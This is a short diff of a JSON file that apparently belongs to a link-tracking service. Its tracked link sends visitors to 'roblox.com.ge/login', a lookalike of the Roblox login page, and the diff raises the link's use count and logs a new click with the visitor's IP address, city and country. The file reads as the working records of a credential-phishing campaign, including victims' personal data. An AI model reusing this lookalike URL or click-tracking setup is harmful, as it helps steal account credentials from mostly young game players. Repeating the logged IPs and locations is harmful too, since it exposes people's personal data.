@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1434,
+    "useCount": 1435,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11640,6 +11640,14 @@
         "city": "Feira de Santana",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777430917321,
+        "ip": "180.195.22.99",
+        "country": "Philippines",
+        "city": "Virac",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
